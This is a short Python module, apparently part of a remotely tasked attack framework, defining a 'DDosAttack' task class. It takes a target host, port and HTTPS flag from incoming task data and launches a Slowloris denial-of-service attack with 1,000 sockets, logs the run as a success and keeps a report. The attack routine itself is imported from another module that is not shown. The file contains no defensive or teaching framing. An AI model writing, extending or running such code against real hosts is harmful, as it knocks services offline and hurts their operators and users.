#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app.models import Task

from app.modules.attacks import Slowloris


class DDosAttack(Task):
    def __init__(self, task_data):
        super().__init__(task_data)
        self.attack_type = self.task_content['attack_type']
        self.target = self.task_content['target']
        self.port = int(self.task_content['port'])
        self.https = True if ('https' in self.task_content and self.task_content['https'] == 'y') else False
        from app.components import logger
        logger.log(self.attack_type, 'DEBUG')
        logger.log(self.target, 'DEBUG')
        logger.log(self.port, 'DEBUG')
        logger.log(self.https, 'DEBUG')

    def start(self):
        # here comes the sugar
        from app.components import logger
        logger.log('starting ddos module...', 'OTHER')

        if self.attack_type == 'slowloris':
            logger.log('starting ddos/slowloris module...', 'OTHER')
            attack = Slowloris(self.target, port=self.port, to_stop_at=self.to_stop_at, enable_https=self.https,
                               n_sockets=1000)
            attack.run()
            logger.log('slowloris executed', 'SUCCESS')
            self.result = attack.report
        Task.start(self)
        # ...
        # return ...


    def run(self):
        return Task.run(self)

